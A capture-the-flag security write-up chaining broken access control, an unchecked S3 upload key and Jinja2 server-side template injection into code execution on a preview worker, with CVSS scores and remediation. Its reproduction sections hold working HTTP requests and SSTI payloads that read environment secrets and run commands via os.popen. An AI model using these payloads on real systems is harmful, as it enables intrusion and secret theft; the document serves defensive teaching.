# Broken Access Control to S3 Template Modification to SSTI and RCE

> This report documents an authorized security test in a CTF environment. Do not test systems without permission. This public version keeps the reproduction flow and root-cause details, but removes sensitive values, credentials, and command payloads that were observed during the challenge.

## Executive summary

The Northline Pages publishing platform had three connected vulnerabilities:

1. An authenticated user could tamper with the `project_id` on the invitation-acceptance request and add their own account to another workspace as an editor.
2. The upload-signing endpoint accepted a client-controlled S3 object key without enforcing a safe destination path. This allowed an editor to overwrite the workspace's template file in object storage.
3. The preview worker used a Jinja2 environment that evaluated attacker-controlled template code. Once the template was modified, the worker executed template expressions as part of the preview generation flow.

This created a chain from unauthorized workspace access to arbitrary template modification to code execution inside the preview worker. The steps below document the reproduction flow and the observed impact.

## Finding 1: Broken access control in project membership creation

- **Target:** `northline.prod.local:9080`
- **Endpoint:** `POST /api/data/project_memberships`
- **Affected parameter:** `project_id`
- **Required access:** Authenticated user account

### Vulnerability

The server trusted the `project_id` and `role` supplied by the client when handling the membership request. An attacker could change the UUID in the request body to target any project and assign themselves the `editor` role.

### Reproduction PoC

I created a second account named Bob and generated an invitation for that account. When Bob accepted the invitation, the request body contained a `project_id` value that I changed to the UUID of the target workspace.

```http
POST /api/data/project_memberships HTTP/1.1
Host: northline.prod.local:9080
Authorization: Bearer {REDACTED}
Content-Type: application/json

{"project_id":"TARGET_WORKSPACE_UUID","user_id":"BOB_USER_UUID","role":"editor"}
```

The server responded with `201 Created`. I confirmed that Bob's dashboard then showed the target workspace, and the Team page exposed the target member names and email addresses.

### Impact

An attacker with an account could add themselves to another workspace without authorization, gain editor access, and read workspace metadata that should not have been visible.

### Remediation

The server should ignore a user-supplied `project_id` when accepting an invite. It should instead load the valid invite record server-side, validate the token, confirm the invitation is still valid, and derive the project, user, and role from the stored invitation data.

## Finding 2: Arbitrary storage key in the upload-signing endpoint

- **Target:** `northline.prod.local:9080`
- **Endpoint:** `POST /api/projects/{project_id}/uploads/sign`
- **Affected parameter:** `key`
- **Required access:** Editor access to a project

### Vulnerability

The upload-signing endpoint accepted an arbitrary object key without validating that it was a permitted location. This allowed an editor to request a pre-signed S3 `PUT` URL for an internal template path, including the project rendering template.

### Reproduction PoC

The Templates page showed that the application rendered Jinja templates. I sent a POST request to the upload-signing endpoint with a key pointing to the project template asset.

```http
POST /api/projects/TARGET_PROJECT_UUID/uploads/sign HTTP/1.1
Host: northline.prod.local:9080
Authorization: Bearer {REDACTED}
Content-Type: application/json

{"key":"projects/TARGET_PROJECT_UUID/render/layout.html"}
```

The server returned a valid pre-signed URL for a `PUT` operation. I then used that URL to upload a modified HTML template body.

```http
PUT /nl-assets/projects/TARGET_PROJECT_UUID/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=... HTTP/1.1
Host: northline.prod.local:9080
Content-Type: text/html

<h1>MODIFIED BY BOB</h1>
<p>{{ site.description }}</p>
```

After triggering a preview, the modified content appeared in the rendered output. This demonstrated that the signed upload endpoint could overwrite the internal template used by the preview worker.

### Impact

An authenticated editor could replace the rendering template for a project and alter the content processed by the preview system. This created the path for server-side template injection.

### Remediation

The server should generate the storage key itself and enforce a strict allowlist. User input should never be able to define a signed upload target for internal template files or path traversal destinations. Internal render templates should be stored outside the user-writable upload area.

## Finding 3: Server-side template injection in the preview worker

- **Target:** `northline.prod.local:9080`
- **Affected component:** Jinja2 rendering in `/app/worker.py`
- **Trigger:** Preview generation after template modification
- **Required access:** Editor access to the project

### Vulnerability

The preview worker parsed the stored template with Jinja2 using the default environment. Because the template content was attacker-controlled and the worker evaluated it, Jinja expressions were executed as part of the preview rendering flow.

### Reproduction PoC

The first proof that the template was being evaluated came from a basic arithmetic expression:

```http
PUT /nl-assets/projects/TARGET_PROJECT_UUID/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=... HTTP/1.1
Host: northline.prod.local:9080
Content-Type: text/html

<h1>MODIFIED BY BOB</h1>
<p>{{ 7 * 7 }}</p>
```

The preview output displayed `49`, proving that Jinja expressions inside the template were executed by the backend.

I then tested access to Python objects via the template engine. The payload was a Jinja expression that traversed into the rendering environment:

```html
{{ self.__init__.__globals__.sys.modules['__main__'].os.environ }}
```

The worker responded with rendered data containing internal environment values and service metadata. In the authorized CTF test, this also led to command execution in the worker container and access to associated worker files and secrets. Those values are intentionally redacted in this public report.

A command execution proof used the same approach but invoked `os.popen()` through the template environment:

```html
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen('id').read() }}
```

This returned command output from inside the worker container. In the challenge environment, this same path was used to access container state and worker-side data.

### Impact

This was a server-side template injection leading to remote code execution in the preview worker. The worker evaluated untrusted template content and executed OS commands in the container context. The challenge test exposed worker environment data, source code, and secret values stored in the worker environment and mounted secret files.

### Remediation

Do not render user-controlled templates in a general-purpose Jinja2 environment. Use a sandboxed environment, reduce the context, and avoid exposing Python internals to templates. If full template rendering is not required, use a logic-less template format or a restricted rendering layer. The worker should also run with minimal privileges, minimal network reachability, and short-lived secrets.

## Overall impact

The combined chain was:

1. self-register an account
2. tamper with `project_id` during invitation acceptance
3. become an editor in another workspace
4. request a signed upload URL for the internal render template
5. overwrite `render/layout.html`
6. trigger preview generation
7. execute Jinja expressions in the worker environment
8. retrieve internal data and run commands in the worker container

This resulted in unauthorized workspace access, template tampering, and remote code execution in the preview worker in the challenge environment.

## CVSS assessment

### Finding 1: Broken access control

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` - **6.5 (Medium)**

The issue allowed workspace membership to be created for another project without authorization. The user had to create and authenticate an account, but self-registration was available.

### Finding 2: Arbitrary storage key in pre-signed uploads

**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` - **4.3 (Medium)**

This required editor access and allowed internal template tampering. It did not by itself expose data, but it enabled the SSTI trigger.

### Finding 3: Server-side template injection leading to code execution

**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` - **9.9 (Critical)**

Once the template was modified, the worker evaluated attacker-controlled expressions and executed commands in the worker container.

### Overall vulnerability chain

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` - **10.0 (Critical)**

This score reflects the full chain from public account creation to unchecked workspace permissions, template overwrite, and worker compromise.

## Remediation summary

1. Treat project membership as a server-side decision. Derive the target project from a valid invitation record, not from a client-supplied `project_id`.
2. Generate upload keys on the server and restrict them to exact, allowlisted object paths. Do not allow user-controlled keys to target internal render templates.
3. Do not render user-controlled templates with a general-purpose Jinja2 environment. Use sandboxing, a restricted context, or a logic-less template system.
4. Run the preview worker with minimal privileges, isolated networking, and short-lived secrets. Remove long-lived credentials from environment variables whenever possible.
5. Treat WAF rules as a detection layer only. They do not replace authorization checks or strict upload validation.
6. Keep Jinja2 patched and reviewed. Version upgrades do not make unsandboxed use of untrusted templates safe.

## References

- [OWASP Top 10: A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger Web Security Academy: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [Jinja2 documentation: Sandboxed Environment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [AWS S3 documentation: Uploading objects with presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
